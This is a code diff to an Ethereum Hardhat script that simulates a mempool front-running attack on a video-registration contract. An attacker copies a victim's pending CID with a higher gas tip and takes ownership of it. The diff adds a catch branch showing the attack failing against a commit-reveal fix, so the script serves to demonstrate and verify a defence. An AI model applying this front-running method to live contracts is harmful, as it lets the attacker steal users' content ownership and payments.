@@ -43,37 +43,50 @@ async function main() {
   const price = ethers.parseEther("0.1");
   console.log(`\nVictim wants to register CID "${cid}" @ ${ethers.formatEther(price)} ETH`);
 
-  // Stop automining so both transactions sit in the mempool together.
-  await ethers.provider.send("evm_setAutomine", [false]);
+  try {
+    // Stop automining so both transactions sit in the mempool together.
+    await ethers.provider.send("evm_setAutomine", [false]);
 
-  // The victim (as the backend would) broadcasts the upload with a LOW tip.
-  const victimTx = await vs.connect(victim).uploadVideo(cid, price, {
-    maxPriorityFeePerGas: GWEI(1), maxFeePerGas: GWEI(200),
-  });
-  console.log("\nVictim broadcast uploadVideo(cid) with tip = 1 gwei (pending in mempool)");
+    // The victim (as the backend would) broadcasts the upload with a LOW tip.
+    const victimTx = await vs.connect(victim).uploadVideo(cid, price, {
+      maxPriorityFeePerGas: GWEI(1), maxFeePerGas: GWEI(200),
+    });
+    console.log("\nVictim broadcast uploadVideo(cid) with tip = 1 gwei (pending in mempool)");
 
-  // The attacker reads the CID from the mempool and front-runs with a HIGH tip.
-  await vs.connect(attacker).uploadVideo(cid, price, {
-    maxPriorityFeePerGas: GWEI(100), maxFeePerGas: GWEI(200),
-  });
-  console.log("Attacker sees the CID and front-runs uploadVideo(cid) with tip = 100 gwei");
+    // The attacker reads the CID from the mempool and front-runs with a HIGH tip.
+    await vs.connect(attacker).uploadVideo(cid, price, {
+      maxPriorityFeePerGas: GWEI(100), maxFeePerGas: GWEI(200),
+    });
+    console.log("Attacker sees the CID and front-runs uploadVideo(cid) with tip = 100 gwei");
 
-  console.log("\nMining the mempool (ordered by tip) ...");
-  const victimReceipt = await mineUntilMined(victimTx.hash);
-  await ethers.provider.send("evm_setAutomine", [true]);
+    console.log("\nMining the mempool (ordered by tip) ...");
+    const victimReceipt = await mineUntilMined(victimTx.hash);
+    await ethers.provider.send("evm_setAutomine", [true]);
 
-  const owner = (await vs.videos(cid)).owner;
-  const victimReverted = victimReceipt !== null && victimReceipt.status === 0;
+    const owner = (await vs.videos(cid)).owner;
+    const victimReverted = victimReceipt !== null && victimReceipt.status === 0;
 
-  console.log("\n--- Result ---");
-  console.log("On-chain owner of the CID:", owner,
-    owner === attacker.address ? "(ATTACKER)" : owner === victim.address ? "(VICTIM)" : "");
-  console.log("Victim tx reverted       :", victimReverted, victimReverted ? "(Video already exists)" : "");
-  if (owner === attacker.address && victimReverted) {
-    console.log("\nAttack succeeded - the attacker stole ownership of the victim's CID.");
-    console.log("The attacker now collects every purchase payment for that video.");
-  } else {
-    console.log("\nAttack failed - the victim kept ownership of the CID.");
+    console.log("\n--- Result ---");
+    console.log("On-chain owner of the CID:", owner,
+      owner === attacker.address ? "(ATTACKER)" : owner === victim.address ? "(VICTIM)" : "");
+    console.log("Victim tx reverted       :", victimReverted, victimReverted ? "(Video already exists)" : "");
+    if (owner === attacker.address && victimReverted) {
+      console.log("\nAttack succeeded - the attacker stole ownership of the victim's CID.");
+      console.log("The attacker now collects every purchase payment for that video.");
+    } else {
+      console.log("\nAttack failed - the victim kept ownership of the CID.");
+    }
+  } catch (e) {
+    // Against the fixed (commit-reveal) contract the plain uploadVideo(cid, price)
+    // call no longer exists, so the front-run cannot even be formed.
+    await ethers.provider.send("evm_setAutomine", [true]).catch(() => {});
+    const reason = (e.shortMessage || e.message || "").split("\n")[0];
+    console.log("\n--- Result ---");
+    console.log("Attack failed - the front-run could not be submitted.");
+    console.log("Reason:", reason);
+    console.log("\nThe contract now requires commit-reveal: uploadVideo(cid, price, salt)");
+    console.log("with a prior commitVideo() bound to msg.sender. The old 2-argument");
+    console.log("uploadVideo(cid, price) no longer exists, so a plain front-run is impossible.");
   }
 }
 
